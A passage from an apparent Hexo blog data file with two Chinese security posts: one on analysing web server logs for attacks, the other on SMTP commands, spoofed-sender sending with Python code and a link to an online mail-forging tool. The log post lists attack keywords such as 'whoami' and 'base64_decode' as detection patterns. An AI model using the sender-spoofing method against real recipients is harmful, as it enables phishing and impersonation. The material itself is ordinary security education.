找出相应的IP地址或(和)user-agent(有些服务器架构问题，导致无法记录原始IP地址,如负载均衡)，将所有的这些日志找出来。\n3. 参考时间线，查看URL信息,服务器响应代码，逐一判断是否攻击成功。比如：是否有成功的webshell调用，SQL注入等等。\n\n## 进阶办法\n\n1. ELK (Elasticsearch + Logstash + Kinaba)\n\n    Elasticsearch 开源分布式搜索引擎\n\n    Logstash 对日志进行收集、过滤并存储到Elasticsearch或其他数据库\n\n    Kibana 对日志分析友好的Web界面,可对Elasticsearch中的数据进行汇总、分析、查询\n\n    [ELK (Elasticsearch + Logstash + Kinaba)](https://www.elastic.co/)\n\n2. 基于WAF/正则规则\n\n    - 将日志数据导入数据库\n    - 建立攻击规则表(可考虑从modsecurity等WAF中提取)\n    - 写SQL语句进行统计\n    \n    [FreeBuf-多线程WEB安全日志分析脚本](http://www.freebuf.com/sectool/110644.html)\n\n    [我的日志分析之道：简单的Web日志分析脚本](http://www.freebuf.com/sectool/126698.html)\n\n3. 干货好文\n\n    [Web日志安全分析浅谈](http://bobao.360.cn/learning/detail/4009.html)\n\n## 海量日志分析\n\n- ### 工具\n\n    spark等大数据相关工具\n\n- ### 方法\n1. 数据预处理\n2. 数据挖掘算法(统计、分类、聚类、关联等多重方法)\n\n- ### 模式\n1. 基于特征的检测\n\n    基于特征，是一种立竿见影的手段，对于一般的攻击很有效，但是永远不可能做到百分百，并且实效性极强，需要强大的响应队伍，对新漏洞尽可能快地做成特征库。\n\n2. 鉴于行为的检测\n    基于行为，是一种较为复杂的方式，是通过数学统计的方式来寻找异常，通过模式学习来寻找异常，但缺点是准确度不确定，可以做到很高，但误报率也很高。\n\n- ### 参考资料\n[使用Flume+Kafka+SparkStreaming进行实时日志分析](http://blog.csdn.net/trigl/article/details/70237981)\n\n## 机器学习方法\n\n啥都不懂，扯犊子，占坑！！！","source":"_posts/WEB日志分析思路与方法.md","raw":"---\ntitle: WEB日志分析思路与方法\ndate: 2017-11-08 09:44:04\ntags: 日志分析\n---\n\n本文很杂乱，主要是为了简单记录一下。网上有一篇好文：[Web日志安全分析浅谈](http://bobao.360.cn/learning/detail/4009.html)\n\n------\n\n从WEB日志数据中，我们也许可以挖掘分析出很多好玩的东西，但在有百度统计之类的产品后，这样的功能再通过日志来实现是很鸡肋的。 然而，站在安全层面上来看，分析WEB日志，可以判断黑客的攻击是否成功？ 攻击路径？ 突破方式？ 损失情况鉴定等。\n\n作为一个安全从业者，也手工分析过一些web日志。在分析的方式/手段/姿势上还需要总结提炼，故进行一下学习记录。\n\n<!--more-->\n\n## 常规办法\n\n人工\"手撕\"日志，效率和效果也许都并不好，但好歹也算是一种方法吧。这种方法处理十来个GB的日志(非压缩)还是勉强能应付的。\n比较传统geek的办法是使用 awk / grep / sort / join 等Unix/Linux工具。这样的方式我不推荐，一来我自己用得不是很溜，二来现在各种文本编辑器的功能非常强大，比如本人目前使用的Visual Studio Code。其它的sublime Text, Notepad++（win）等\n\n0. 直接将数据载入文本编辑器。\n1. 搜索\"base64_decode\",\"evil\",\"python-urllib\",\"system\",\"whoami\",\"ipconfig\",\"select\",\"script\"等关键字，定位疑似攻击的日志项。\n2. 找出相应的IP地址或(和)user-agent(有些服务器架构问题，导致无法记录原始IP地址,如负载均衡)，将所有的这些日志找出来。\n3. 参考时间线，查看URL信息,服务器响应代码，逐一判断是否攻击成功。比如：是否有成功的webshell调用，SQL注入等等。\n\n## 进阶办法\n\n1. ELK (Elasticsearch + Logstash + Kinaba)\n\n    Elasticsearch 开源分布式搜索引擎\n\n    Logstash 对日志进行收集、过滤并存储到Elasticsearch或其他数据库\n\n    Kibana 对日志分析友好的Web界面,可对Elasticsearch中的数据进行汇总、分析、查询\n\n    [ELK (Elasticsearch + Logstash + Kinaba)](https://www.elastic.co/)\n\n2. 基于WAF/正则规则\n\n    - 将日志数据导入数据库\n    - 建立攻击规则表(可考虑从modsecurity等WAF中提取)\n    - 写SQL语句进行统计\n    \n    [FreeBuf-多线程WEB安全日志分析脚本](http://www.freebuf.com/sectool/110644.html)\n\n    [我的日志分析之道：简单的Web日志分析脚本](http://www.freebuf.com/sectool/126698.html)\n\n3. 干货好文\n\n    [Web日志安全分析浅谈](http://bobao.360.cn/learning/detail/4009.html)\n\n## 海量日志分析\n\n- ### 工具\n\n    spark等大数据相关工具\n\n- ### 方法\n1. 数据预处理\n2. 数据挖掘算法(统计、分类、聚类、关联等多重方法)\n\n- ### 模式\n1. 基于特征的检测\n\n    基于特征，是一种立竿见影的手段，对于一般的攻击很有效，但是永远不可能做到百分百，并且实效性极强，需要强大的响应队伍，对新漏洞尽可能快地做成特征库。\n\n2. 鉴于行为的检测\n    基于行为，是一种较为复杂的方式，是通过数学统计的方式来寻找异常，通过模式学习来寻找异常，但缺点是准确度不确定，可以做到很高，但误报率也很高。\n\n- ### 参考资料\n[使用Flume+Kafka+SparkStreaming进行实时日志分析](http://blog.csdn.net/trigl/article/details/70237981)\n\n## 机器学习方法\n\n啥都不懂，扯犊子，占坑！！！","slug":"WEB日志分析思路与方法","published":1,"updated":"2017-11-08T08:08:41.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfsd000e97uvdsupb0ge","content":"<p>本文很杂乱，主要是为了简单记录一下。网上有一篇好文：<a href=\"http://bobao.360.cn/learning/detail/4009.html\" target=\"_blank\" rel=\"external\">Web日志安全分析浅谈</a></p>\n<hr>\n<p>从WEB日志数据中，我们也许可以挖掘分析出很多好玩的东西，但在有百度统计之类的产品后，这样的功能再通过日志来实现是很鸡肋的。 然而，站在安全层面上来看，分析WEB日志，可以判断黑客的攻击是否成功？ 攻击路径？ 突破方式？ 损失情况鉴定等。</p>\n<p>作为一个安全从业者，也手工分析过一些web日志。在分析的方式/手段/姿势上还需要总结提炼，故进行一下学习记录。</p>\n<a id=\"more\"></a>\n<h2 id=\"常规办法\"><a href=\"#常规办法\" class=\"headerlink\" title=\"常规办法\"></a>常规办法</h2><p>人工”手撕”日志，效率和效果也许都并不好，但好歹也算是一种方法吧。这种方法处理十来个GB的日志(非压缩)还是勉强能应付的。<br>比较传统geek的办法是使用 awk / grep / sort / join 等Unix/Linux工具。这样的方式我不推荐，一来我自己用得不是很溜，二来现在各种文本编辑器的功能非常强大，比如本人目前使用的Visual Studio Code。其它的sublime Text, Notepad++（win）等</p>\n<ol>\n<li>直接将数据载入文本编辑器。</li>\n<li>搜索”base64_decode”,”evil”,”python-urllib”,”system”,”whoami”,”ipconfig”,”select”,”script”等关键字，定位疑似攻击的日志项。</li>\n<li>找出相应的IP地址或(和)user-agent(有些服务器架构问题，导致无法记录原始IP地址,如负载均衡)，将所有的这些日志找出来。</li>\n<li>参考时间线，查看URL信息,服务器响应代码，逐一判断是否攻击成功。比如：是否有成功的webshell调用，SQL注入等等。</li>\n</ol>\n<h2 id=\"进阶办法\"><a href=\"#进阶办法\" class=\"headerlink\" title=\"进阶办法\"></a>进阶办法</h2><ol>\n<li><p>ELK (Elasticsearch + Logstash + Kinaba)</p>\n<p> Elasticsearch 开源分布式搜索引擎</p>\n<p> Logstash 对日志进行收集、过滤并存储到Elasticsearch或其他数据库</p>\n<p> Kibana 对日志分析友好的Web界面,可对Elasticsearch中的数据进行汇总、分析、查询</p>\n<p> <a href=\"https://www.elastic.co/\" target=\"_blank\" rel=\"external\">ELK (Elasticsearch + Logstash + Kinaba)</a></p>\n</li>\n<li><p>基于WAF/正则规则</p>\n<ul>\n<li>将日志数据导入数据库</li>\n<li>建立攻击规则表(可考虑从modsecurity等WAF中提取)</li>\n<li><p>写SQL语句进行统计</p>\n<p><a href=\"http://www.freebuf.com/sectool/110644.html\" target=\"_blank\" rel=\"external\">FreeBuf-多线程WEB安全日志分析脚本</a></p>\n<p><a href=\"http://www.freebuf.com/sectool/126698.html\" target=\"_blank\" rel=\"external\">我的日志分析之道：简单的Web日志分析脚本</a></p>\n</li>\n</ul>\n</li>\n<li><p>干货好文</p>\n<p> <a href=\"http://bobao.360.cn/learning/detail/4009.html\" target=\"_blank\" rel=\"external\">Web日志安全分析浅谈</a></p>\n</li>\n</ol>\n<h2 id=\"海量日志分析\"><a href=\"#海量日志分析\" class=\"headerlink\" title=\"海量日志分析\"></a>海量日志分析</h2><ul>\n<li><h3 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h3><p>  spark等大数据相关工具</p>\n</li>\n<li><h3 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h3></li>\n</ul>\n<ol>\n<li>数据预处理</li>\n<li>数据挖掘算法(统计、分类、聚类、关联等多重方法)</li>\n</ol>\n<ul>\n<li><h3 id=\"模式\"><a href=\"#模式\" class=\"headerlink\" title=\"模式\"></a>模式</h3></li>\n</ul>\n<ol>\n<li><p>基于特征的检测</p>\n<p> 基于特征，是一种立竿见影的手段，对于一般的攻击很有效，但是永远不可能做到百分百，并且实效性极强，需要强大的响应队伍，对新漏洞尽可能快地做成特征库。</p>\n</li>\n<li><p>鉴于行为的检测<br> 基于行为，是一种较为复杂的方式，是通过数学统计的方式来寻找异常，通过模式学习来寻找异常，但缺点是准确度不确定，可以做到很高，但误报率也很高。</p>\n</li>\n</ol>\n<ul>\n<li><h3 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h3><a href=\"http://blog.csdn.net/trigl/article/details/70237981\" target=\"_blank\" rel=\"external\">使用Flume+Kafka+SparkStreaming进行实时日志分析</a></li>\n</ul>\n<h2 id=\"机器学习方法\"><a href=\"#机器学习方法\" class=\"headerlink\" title=\"机器学习方法\"></a>机器学习方法</h2><p>啥都不懂，扯犊子，占坑！！！</p>\n","site":{"data":{}},"excerpt":"<p>本文很杂乱，主要是为了简单记录一下。网上有一篇好文：<a href=\"http://bobao.360.cn/learning/detail/4009.html\">Web日志安全分析浅谈</a></p>\n<hr>\n<p>从WEB日志数据中，我们也许可以挖掘分析出很多好玩的东西，但在有百度统计之类的产品后，这样的功能再通过日志来实现是很鸡肋的。 然而，站在安全层面上来看，分析WEB日志，可以判断黑客的攻击是否成功？ 攻击路径？ 突破方式？ 损失情况鉴定等。</p>\n<p>作为一个安全从业者，也手工分析过一些web日志。在分析的方式/手段/姿势上还需要总结提炼，故进行一下学习记录。</p>","more":"<h2 id=\"常规办法\"><a href=\"#常规办法\" class=\"headerlink\" title=\"常规办法\"></a>常规办法</h2><p>人工”手撕”日志，效率和效果也许都并不好，但好歹也算是一种方法吧。这种方法处理十来个GB的日志(非压缩)还是勉强能应付的。<br>比较传统geek的办法是使用 awk / grep / sort / join 等Unix/Linux工具。这样的方式我不推荐，一来我自己用得不是很溜，二来现在各种文本编辑器的功能非常强大，比如本人目前使用的Visual Studio Code。其它的sublime Text, Notepad++（win）等</p>\n<ol>\n<li>直接将数据载入文本编辑器。</li>\n<li>搜索”base64_decode”,”evil”,”python-urllib”,”system”,”whoami”,”ipconfig”,”select”,”script”等关键字，定位疑似攻击的日志项。</li>\n<li>找出相应的IP地址或(和)user-agent(有些服务器架构问题，导致无法记录原始IP地址,如负载均衡)，将所有的这些日志找出来。</li>\n<li>参考时间线，查看URL信息,服务器响应代码，逐一判断是否攻击成功。比如：是否有成功的webshell调用，SQL注入等等。</li>\n</ol>\n<h2 id=\"进阶办法\"><a href=\"#进阶办法\" class=\"headerlink\" title=\"进阶办法\"></a>进阶办法</h2><ol>\n<li><p>ELK (Elasticsearch + Logstash + Kinaba)</p>\n<p> Elasticsearch 开源分布式搜索引擎</p>\n<p> Logstash 对日志进行收集、过滤并存储到Elasticsearch或其他数据库</p>\n<p> Kibana 对日志分析友好的Web界面,可对Elasticsearch中的数据进行汇总、分析、查询</p>\n<p> <a href=\"https://www.elastic.co/\">ELK (Elasticsearch + Logstash + Kinaba)</a></p>\n</li>\n<li><p>基于WAF/正则规则</p>\n<ul>\n<li>将日志数据导入数据库</li>\n<li>建立攻击规则表(可考虑从modsecurity等WAF中提取)</li>\n<li><p>写SQL语句进行统计</p>\n<p><a href=\"http://www.freebuf.com/sectool/110644.html\">FreeBuf-多线程WEB安全日志分析脚本</a></p>\n<p><a href=\"http://www.freebuf.com/sectool/126698.html\">我的日志分析之道：简单的Web日志分析脚本</a></p>\n</li>\n</ul>\n</li>\n<li><p>干货好文</p>\n<p> <a href=\"http://bobao.360.cn/learning/detail/4009.html\">Web日志安全分析浅谈</a></p>\n</li>\n</ol>\n<h2 id=\"海量日志分析\"><a href=\"#海量日志分析\" class=\"headerlink\" title=\"海量日志分析\"></a>海量日志分析</h2><ul>\n<li><h3 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h3><p>  spark等大数据相关工具</p>\n</li>\n<li><h3 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h3></li>\n</ul>\n<ol>\n<li>数据预处理</li>\n<li>数据挖掘算法(统计、分类、聚类、关联等多重方法)</li>\n</ol>\n<ul>\n<li><h3 id=\"模式\"><a href=\"#模式\" class=\"headerlink\" title=\"模式\"></a>模式</h3></li>\n</ul>\n<ol>\n<li><p>基于特征的检测</p>\n<p> 基于特征，是一种立竿见影的手段，对于一般的攻击很有效，但是永远不可能做到百分百，并且实效性极强，需要强大的响应队伍，对新漏洞尽可能快地做成特征库。</p>\n</li>\n<li><p>鉴于行为的检测<br> 基于行为，是一种较为复杂的方式，是通过数学统计的方式来寻找异常，通过模式学习来寻找异常，但缺点是准确度不确定，可以做到很高，但误报率也很高。</p>\n</li>\n</ol>\n<ul>\n<li><h3 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h3><a href=\"http://blog.csdn.net/trigl/article/details/70237981\">使用Flume+Kafka+SparkStreaming进行实时日志分析</a></li>\n</ul>\n<h2 id=\"机器学习方法\"><a href=\"#机器学习方法\" class=\"headerlink\" title=\"机器学习方法\"></a>机器学习方法</h2><p>啥都不懂，扯犊子，占坑！！！</p>"},{"title":"SMTP命令行及Python发送邮件","date":"2017-10-18T02:32:35.000Z","_content":"## SMTP发送邮件 - 命令行\n**SMTP (Simple Mail Transfer Protocol)** : 电子邮件从客户机传输到服务器或从某一个服务器传输到另一个服务器使用的传输协议。 SMTP 是请求/响应协议，命令和响应都是基于 ASCII 文本，并以 CR 和 LF 符结束。响应包括一个表示返回状态的三位数字代码。SMTP 在 TCP 协议 25 端口监听连接请求。\n\n**ESMTP (Extended SMTP)**，顾名思义，扩展 SMTP 就是对标准 SMTP 协议进行的扩展。它与 SMTP 服务的区别仅仅是，使用 SMTP 发信不需要验证用户帐户，而用 ESMTP 发信时， 服务器会要求用户提供用户名和密码以便验证身份。验证之后的邮件发送过程与 SMTP 方式一致。\n<!-- more -->\n### SMTP命令\n**HELO** 向服务器标识用户身份。(SMTP)\n\n**EHLO** 向服务器标识用户身份。(ESMTP)\n\n**AUTH LOGIN** 用户身份认证，后续陆续发送用户名和密码的base64编码。\n\n**MAIL FROM** 命令中指定的地址是发件人地址\n\n**RCPT TO** 标识单个的邮件接收人；可有多个 RCPT TO；常在 MAIL 命令后面。\n\n**DATA** 在单个或多个 RCPT 命令后，表示所有的邮件接收人已标识，并初始化数据传输，以 CRLF.CRLF 结束 \n\n**VRFY** 用于验证指定的用户/邮箱是否存在；由于安全方面的原因，服务器常禁止此命令\n\n**EXPN** 验证给定的邮箱列表是否存在，扩充邮箱列表，也常被禁用 \n\n**HELP** 查询服务器支持什么命令 \n\n**NOOP** 无操作，服务器应响应 OK \n\n**RSET** 重置会话，当前传输被取消\n\n**QUIT** 结束会话 \n\n- 正常发信模式（client --> server)\n\n    类似于邮件客户端将邮件发送到自己的邮件服务器。所以需要验证发件人的账号密码。\n- 伪造发信模式(fake server --> server)\n    \n    类似于A.com向B.com发送邮件，直接连接到B.com的服务器然后宣称自己是A.com。这就不需要身份验证了。但如果A.com配置了SPF，那么B.com服务器将校验spf声明的邮件服务器IP与当前发件服务器IP是否一致，如否则拒绝接受！\n\n- 两种模式的命令行试验：\n    ![](SMTP命令行及Python发送邮件/screenshot01.png)\n\n## SMTP发送邮件 - Python3\n\n参考资料：[廖雪峰-Python教程-SMTP发送邮件](https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432005226355aadb8d4b2f3f42f6b1d6f2c5bd8d5263000)\n\n简单的代码实现如下：\n```python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport pdb\nimport logging\nfrom email.mime.text import MIMEText\nimport smtplib\n\nlogging.basicConfig(level=logging.INFO)\nmsg=MIMEText('hello,send by python,,,,','plain','utf-8')\nlogging.info(\"MIME编码\\n%s\"%msg)\n\n#pdb.set_trace()\n\nfrom_addr=\"a@1.com\"\nto_addr=\"songgongbin@tass.com.cn\"\n\n\nsmtp=smtplib.SMTP('qiye163mx01.mxmail.netease.com',25)\n#smtp.starttls()     # 使用SSL时使用。\nsmtp.set_debuglevel(1) #查看交互信息\nsmtp.sendmail(from_addr,to_addr,msg.as_string())\nsmtp.quit\n```\n![](SMTP命令行及Python发送邮件/screenshot02.png)\n发送肯定是没问题的，但显然命中了网易的反垃圾邮件策略，被拒收了！具体什么是怎样的策略，我不是很清楚了。\n\n## 其它\n\n在线邮件伪造工具：[http://tool.chacuo.net/mailanonymous/](http://tool.chacuo.net/mailanonymous/)\n\nPython官方资料：[https://docs.python.org/3.6/library/smtplib.html#](https://docs.python.org/3.6/library/smtplib.html#)\n\n","source":"_posts/SMTP命令行及Python发送邮件.md","raw":"---\ntitle: SMTP命令行及Python发送邮件\ndate: 2017-10-18 10:32:35\ntags: \n---\n## SMTP发送邮件 - 命令行\n**SMTP (Simple Mail Transfer Protocol)** : 电子邮件从客户机传输到服务器或从某一个服务器传输到另一个服务器使用的传输协议。 SMTP 是请求/响应协议，命令和响应都是基于 ASCII 文本，并以 CR 和 LF 符结束。响应包括一个表示返回状态的三位数字代码。SMTP 在 TCP 协议 25 端口监听连接请求。\n\n**ESMTP (Extended SMTP)**，顾名思义，扩展 SMTP 就是对标准 SMTP 协议进行的扩展。它与 SMTP 服务的区别仅仅是，使用 SMTP 发信不需要验证用户帐户，而用 ESMTP 发信时， 服务器会要求用户提供用户名和密码以便验证身份。验证之后的邮件发送过程与 SMTP 方式一致。\n<!-- more -->\n### SMTP命令\n**HELO** 向服务器标识用户身份。(SMTP)\n\n**EHLO** 向服务器标识用户身份。(ESMTP)\n\n**AUTH LOGIN** 用户身份认证，后续陆续发送用户名和密码的base64编码。\n\n**MAIL FROM** 命令中指定的地址是发件人地址\n\n**RCPT TO** 标识单个的邮件接收人；可有多个 RCPT TO；常在 MAIL 命令后面。\n\n**DATA** 在单个或多个 RCPT 命令后，表示所有的邮件接收人已标识，并初始化数据传输，以 CRLF.CRLF 结束 \n\n**VRFY** 用于验证指定的用户/邮箱是否存在；由于安全方面的原因，服务器常禁止此命令\n\n**EXPN** 验证给定的邮箱列表是否存在，扩充邮箱列表，也常被禁用 \n\n**HELP** 查询服务器支持什么命令 \n\n**NOOP** 无操作，服务器应响应 OK \n\n**RSET** 重置会话，当前传输被取消\n\n**QUIT** 结束会话 \n\n- 正常发信模式（client --> server)\n\n    类似于邮件客户端将邮件发送到自己的邮件服务器。所以需要验证发件人的账号密码。\n- 伪造发信模式(fake server --> server)\n    \n    类似于A.com向B.com发送邮件，直接连接到B.com的服务器然后宣称自己是A.com。这就不需要身份验证了。但如果A.com配置了SPF，那么B.com服务器将校验spf声明的邮件服务器IP与当前发件服务器IP是否一致，如否则拒绝接受！\n\n- 两种模式的命令行试验：\n    ![](SMTP命令行及Python发送邮件/screenshot01.png)\n\n## SMTP发送邮件 - Python3\n\n参考资料：[廖雪峰-Python教程-SMTP发送邮件](https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432005226355aadb8d4b2f3f42f6b1d6f2c5bd8d5263000)\n\n简单的代码实现如下：\n```python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport pdb\nimport logging\nfrom email.mime.text import MIMEText\nimport smtplib\n\nlogging.basicConfig(level=logging.INFO)\nmsg=MIMEText('hello,send by python,,,,','plain','utf-8')\nlogging.info(\"MIME编码\\n%s\"%msg)\n\n#pdb.set_trace()\n\nfrom_addr=\"a@1.com\"\nto_addr=\"songgongbin@tass.com.cn\"\n\n\nsmtp=smtplib.SMTP('qiye163mx01.mxmail.netease.com',25)\n#smtp.starttls()     # 使用SSL时使用。\nsmtp.set_debuglevel(1) #查看交互信息\nsmtp.sendmail(from_addr,to_addr,msg.as_string())\nsmtp.quit\n```\n![](SMTP命令行及Python发送邮件/screenshot02.png)\n发送肯定是没问题的，但显然命中了网易的反垃圾邮件策略，被拒收了！具体什么是怎样的策略，我不是很清楚了。\n\n## 其它\n\n在线邮件伪造工具：[http://tool.chacuo.net/mailanonymous/](http://tool.chacuo.net/mailanonymous/)\n\nPython官方资料：[https://docs.python.org/3.6/library/smtplib.html#](https://docs.python.org/3.6/library/smtplib.html#)\n\n","slug":"SMTP命令行及Python发送邮件","published":1,"updated":"2017-10-18T09:44:25.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfsf000h97uv963sx4eg","content":"<h2 id=\"SMTP发送邮件-命令行\"><a href=\"#SMTP发送邮件-命令行\" class=\"headerlink\" title=\"SMTP发送邮件 - 命令行\"></a>SMTP发送邮件 - 命令行</h2><p><strong>SMTP (Simple Mail Transfer Protocol)</strong> : 电子邮件从客户机传输到服务器或从某一个服务器传输到另一个服务器使用的传输协议。 SMTP 是请求/响应协议，命令和响应都是基于 ASCII 文本，并以 CR 和 LF 符结束。响应包括一个表示返回状态的三位数字代码。SMTP 在 TCP 协议 25 端口监听连接请求。</p>\n<p><strong>ESMTP (Extended SMTP)</strong>，顾名思义，扩展 SMTP 就是对标准 SMTP 协议进行的扩展。它与 SMTP 服务的区别仅仅是，使用 SMTP 发信不需要验证用户帐户，而用 ESMTP 发信时， 服务器会要求用户提供用户名和密码以便验证身份。验证之后的邮件发送过程与 SMTP 方式一致。<br><a id=\"more\"></a></p>\n<h3 id=\"SMTP命令\"><a href=\"#SMTP命令\" class=\"headerlink\" title=\"SMTP命令\"></a>SMTP命令</h3><p><strong>HELO</strong> 向服务器标识用户身份。(SMTP)</p>\n<p><strong>EHLO</strong> 向服务器标识用户身份。(ESMTP)</p>\n<p><strong>AUTH LOGIN</strong> 用户身份认证，后续陆续发送用户名和密码的base64编码。</p>\n<p><strong>MAIL FROM</strong> 命令中指定的地址是发件人地址</p>\n<p><strong>RCPT TO</strong> 标识单个的邮件接收人；可有多个 RCPT TO；常在 MAIL 命令后面。</p>\n<p><strong>DATA</strong> 在单个或多个 RCPT 命令后，表示所有的邮件接收人已标识，并初始化数据传输，以 CRLF.CRLF 结束 </p>\n<p><strong>VRFY</strong> 用于验证指定的用户/邮箱是否存在；由于安全方面的原因，服务器常禁止此命令</p>\n<p><strong>EXPN</strong> 验证给定的邮箱列表是否存在，扩充邮箱列表，也常被禁用 </p>\n<p><strong>HELP</strong> 查询服务器支持什么命令 </p>\n<p><strong>NOOP</strong> 无操作，服务器应响应 OK </p>\n<p><strong>RSET</strong> 重置会话，当前传输被取消</p>\n<p><strong>QUIT</strong> 结束会话 </p>\n<ul>\n<li><p>正常发信模式（client –&gt; server)</p>\n<p>  类似于邮件客户端将邮件发送到自己的邮件服务器。所以需要验证发件人的账号密码。</p>\n</li>\n<li><p>伪造发信模式(fake server –&gt; server)</p>\n<p>  类似于A.com向B.com发送邮件，直接连接到B.com的服务器然后宣称自己是A.com。这就不需要身份验证了。但如果A.com配置了SPF，那么B.com服务器将校验spf声明的邮件服务器IP与当前发件服务器IP是否一致，如否则拒绝接受！</p>\n</li>\n<li><p>两种模式的命令行试验：<br>  <img src=\"/2017/10/SMTP命令行及Python发送邮件/screenshot01.png\" alt=\"\"></p>\n</li>\n</ul>\n<h2 id=\"SMTP发送邮件-Python3\"><a href=\"#SMTP发送邮件-Python3\" class=\"headerlink\" title=\"SMTP发送邮件 - Python3\"></a>SMTP发送邮件 - Python3</h2><p>参考资料：<a href=\"https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432005226355aadb8d4b2f3f42f6b1d6f2c5bd8d5263000\" target=\"_blank\" rel=\"external\">廖雪峰-Python教程-SMTP发送邮件</a></p>\n<p>简单的代码实现如下：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> pdb</div><div class=\"line\"><span class=\"keyword\">import</span> logging</div><div class=\"line\"><span class=\"keyword\">from</span> email.mime.text <span class=\"keyword\">import</span> MIMEText</div><div class=\"line\"><span class=\"keyword\">import</span> smtplib</div><div class=\"line\"></div><div class=\"line\">logging.basicConfig(level=logging.INFO)</div><div class=\"line\">msg=MIMEText(<span class=\"string\">'hello,send by python,,,,'</span>,<span class=\"string\">'plain'</span>,<span class=\"string\">'utf-8'</span>)</div><div class=\"line\">logging.info(<span class=\"string\">\"MIME编码\\n%s\"</span>%msg)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#pdb.set_trace()</span></div><div class=\"line\"></div><div class=\"line\">from_addr=<span class=\"string\">\"a@1.com\"</span></div><div class=\"line\">to_addr=<span class=\"string\">\"songgongbin@tass.com.cn\"</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">smtp=smtplib.SMTP(<span class=\"string\">'qiye163mx01.mxmail.netease.com'</span>,<span class=\"number\">25</span>)</div><div class=\"line\"><span class=\"comment\">#smtp.starttls()     # 使用SSL时使用。</span></div><div class=\"line\">smtp.set_debuglevel(<span class=\"number\">1</span>) <span class=\"comment\">#查看交互信息</span></div><div class=\"line\">smtp.sendmail(from_addr,to_addr,msg.as_string())</div><div class=\"line\">smtp.quit</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/10/SMTP命令行及Python发送邮件/screenshot02.png\" alt=\"\"><br>发送肯定是没问题的，但显然命中了网易的反垃圾邮件策略，被拒收了！具体什么是怎样的策略，我不是很清楚了。</p>\n<h2 id=\"其它\"><a href=\"#其它\" class=\"headerlink\" title=\"其它\"></a>其它</h2><p>在线邮件伪造工具：<a href=\"http://tool.chacuo.net/mailanonymous/\" target=\"_blank\" rel=\"external\">http://tool.chacuo.net/mailanonymous/</a></p>\n<p>Python官方资料：<a href=\"https://docs.python.org/3.6/library/smtplib.html#\" target=\"_blank\" rel=\"external\">https://docs.python.org/3.6/library/smtplib.html#</a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"SMTP发送邮件-命令行\"><a href=\"#SMTP发送邮件-命令行\" class=\"headerlink\" title=\"SMTP发送邮件 - 命令行\"></a>SMTP发送邮件 - 命令行</h2><p><strong>SMTP (Simple Mail Transfer Protocol)</strong> : 电子邮件从客户机传输到服务器或从某一个服务器传输到另一个服务器使用的传输协议。 SMTP 是请求/响应协议，命令和响应都是基于 ASCII 文本，并以 CR 和 LF 符结束。响应包括一个表示返回状态的三位数字代码。SMTP 在 TCP 协议 25 端口监听连接请求。</p>\n<p><strong>ESMTP (Extended SMTP)</strong>，顾名思义，扩展 SMTP 就是对标准 SMTP 协议进行的扩展。它与 SMTP 服务的区别仅仅是，使用 SMTP 发信不需要验证用户帐户，而用 ESMTP 发信时， 服务器会要求用户提供用户名和密码以便验证身份。验证之后的邮件发送过程与 SMTP 方式一致。<br></p>","more":"<p></p>\n<h3 id=\"SMTP命令\"><a href=\"#SMTP命令\" class=\"headerlink\" title=\"SMTP命令\"></a>SMTP命令</h3><p><strong>HELO</strong> 向服务器标识用户身份。(SMTP)</p>\n<p><strong>EHLO</strong> 向服务器标识用户身份。(ESMTP)</p>\n<p><strong>AUTH LOGIN</strong> 用户身份认证，后续陆续发送用户名和密码的base64编码。</p>\n<p><strong>MAIL FROM</strong> 命令中指定的地址是发件人地址</p>\n<p><strong>RCPT TO</strong> 标识单个的邮件接收人；可有多个 RCPT TO；常在 MAIL 命令后面。</p>\n<p><strong>DATA</strong> 在单个或多个 RCPT 命令后，表示所有的邮件接收人已标识，并初始化数据传输，以 CRLF.CRLF 结束 </p>\n<p><strong>VRFY</strong> 用于验证指定的用户/邮箱是否存在；由于安全方面的原因，服务器常禁止此命令</p>\n<p><strong>EXPN</strong> 验证给定的邮箱列表是否存在，扩充邮箱列表，也常被禁用 </p>\n<p><strong>HELP</strong> 查询服务器支持什么命令 </p>\n<p><strong>NOOP</strong> 无操作，服务器应响应 OK </p>\n<p><strong>RSET</strong> 重置会话，当前传输被取消</p>\n<p><strong>QUIT</strong> 结束会话 </p>\n<ul>\n<li><p>正常发信模式（client –&gt; server)</p>\n<p>  类似于邮件客户端将邮件发送到自己的邮件服务器。所以需要验证发件人的账号密码。</p>\n</li>\n<li><p>伪造发信模式(fake server –&gt; server)</p>\n<p>  